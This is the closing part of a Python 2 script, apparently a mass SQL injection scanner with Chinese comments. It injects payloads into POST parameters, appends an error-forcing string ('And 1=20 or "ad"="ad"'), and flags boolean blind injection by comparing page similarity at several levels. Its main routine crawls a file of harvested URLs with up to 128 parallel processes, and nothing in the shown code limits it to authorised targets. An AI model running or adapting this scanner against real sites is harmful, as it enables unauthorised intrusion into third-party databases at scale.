                                data_str_com = data_str_01 + data_str_02_02 + data_str_03
                                data_payload[i] = f_v[i].replace('[INJECTION]', data_str_pay)
                                data_comparsion[i] = f_v[i].replace('[INJECTION]', data_str_com)
                            # print  '[Level 3 Post]:' + url_domain + str(data_payload)
                            # print  '[Level 3 Post]:' + url_domain + str(data_comparsion)

                            url_error = url + ' And 1=20 or "ad"="ad" \%23--+'
                            dix1 = diffent_post(url1=url, url2=url_domain, url2_data=data_payload)
                            # 代表原始网页与正请求
                            dix2 = diffent_post(url1=url, url2=url_error)
                            # 代表原始网页与错误网页
                            dix3 = diffent_post(url1=url, url2=url_domain, url2_data=data_comparsion)
                            # 代表原始网页与负请求
                            dix4 = diffent_post(url1=url_error, url2=url_domain, url2_data=data_payload)
                            # 代表错误网页与正请求
                            dix5 = diffent_post(url1=url_error, url2=url_domain, url2_data=data_comparsion)
                            # 代表错误网页与负请求
                            dix6 = diffent_post(url1=url_domain, url1_data=data_payload, url2=url_domain,
                                                url2_data=data_comparsion)
                            # 代表正请求与负请求
                            # # print  '原始网页与正请求' + str(dix1)
                            # # print  '原始网页与错误网页' + str(dix2)
                            # # print  '原始网页与负请求' + str(dix3)
                            # # print  '错误网页与正请求' + str(dix4)
                            # # print  '错误网页与负请求' + str(dix5)
                            # # print  '正请求与负请求' + str(dix6)
                            if dix6 < 9700:
                                if k['level'] == '1':
                                    # # print  'level 1 原始网页与正请求' + str(dix1)
                                    # # print  'level 1 原始网页与错误网页' + str(dix2)
                                    # # print  'level 1 原始网页与负请求' + str(dix3)
                                    # # print  'level 1 错误网页与正请求' + str(dix4)
                                    # # print  'level 1 错误网页与负请求' + str(dix5)
                                    # # print  'level 1 正请求与负请求' + str(dix6)
                                    # 错误网页与正常网页一样话，就不妙了
                                    if dix2 == 10000:
                                        # 那么只能依靠正请求与原始网页一样，正负请求不一样
                                        if dix1 > 9900 and dix6 < 9700:
                                            result['url'] = url
                                            result['type'] = 'Post_Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result
                                        pass
                                    else:
                                        # 如果错误网页和原始网页不一样，存在waf和不存在waf略有区别
                                        # 正请求和原始网页一样，负请求和原始网页不一样，正负请求不一样
                                        if dix1 > 9900 and dix4 < 7300 and dix3 < 7300:
                                            result['url'] = url
                                            result['type'] = 'Post_Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result
                                if k['level'] == '3':
                                    # # print  'level 3 原始网页与正请求' + str(dix1)
                                    # # print  'level 3 原始网页与错误网页' + str(dix2)
                                    # # print  'level 3 原始网页与负请求' + str(dix3)
                                    # # print  'level 3 错误网页与正请求' + str(dix4)
                                    # # print  'level 3 错误网页与负请求' + str(dix5)
                                    # # print  'level 3 正请求与负请求' + str(dix6)
                                    # 错误网页与正常网页一样话，就不妙了
                                    if dix2 == 10000:
                                        # 那么只能依靠正请求与原始网页一样，正负请求不一样
                                        if dix1 > 9900 and dix6 < 9700:
                                            result['url'] = url
                                            result['type'] = 'Post_Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result
                                        pass
                                    else:
                                        # 如果错误网页和原始网页不一样，存在waf和不存在waf略有区别
                                        # 正请求和原始网页一样，负请求和原始网页不一样，正负请求不一样
                                        if dix1 > 9900 and dix4 < 7300 and dix3 < 7300:
                                            result['url'] = url
                                            result['type'] = 'Post_Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            return result
                                if k['level'] == '2':
                                    # # print  'level 2 原始网页与正请求' + str(dix1)
                                    # # print  'level 2 原始网页与错误网页' + str(dix2)
                                    # # print  'level 2 原始网页与负请求' + str(dix3)
                                    # # print  'level 2 错误网页与正请求' + str(dix4)
                                    # # print  'level 2 错误网页与负请求' + str(dix5)
                                    # # print  'level 2 正请求与负请求' + str(dix6)
                                    '''
                                    代表正请求与原始页面不一样，正请求与错误页面可能不一样，正请求与负请求页面不一样，负请求与原始页面一样，负请求与错误页面不一样(有waf就一样)
                                    '''
                                    if dix2 == 10000:
                                        if dix1 < 7300 and dix6 < 7300 and dix3 > 9700:
                                            result['url'] = url
                                            result['type'] = 'Post_Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result
                                    else:
                                        if dix1 < 7300 and dix6 < 7300 and dix3 > 9700:
                                            result['url'] = url
                                            result['type'] = 'Post_Bool_Blind_Injection'
                                            result['dbms'] = k['dbms']
                                            result['payload'] = k['payload']
                                            # with open('result.txt', 'a+')as a:
                                                # a.write(str(result) + '\n')
                                            return result


                except Exception, e:
                    pass
        except Exception, e:
            pass
    return None


def get_url_sql(url, level=1):
    all_links = get_links(url)
    if all_links != None:
        for ur in all_links:
            get_scan(ur, level=level)
            post_scan(ur, level=level)


if __name__ == '__main__':
    multiprocessing.freeze_support()
    New_start = raw_input(unicode('把采集的url文本拖拽进来:', 'utf-8').encode('gbk'))
    levels = int(raw_input(unicode('设置扫描等级(1/2/3/4):', 'utf-8').encode('gbk')))
    countss = int(raw_input(unicode('设置扫描进程数(8-128):', 'utf-8').encode('gbk')))
    p = multiprocessing.Pool(countss)
    list_ = list(set([x.replace('\n', '') for x in open(New_start, 'r')]))
    for x in list_:
        p.apply_async(get_url_sql, args=(x, levels))
    p.close()
    p.join()

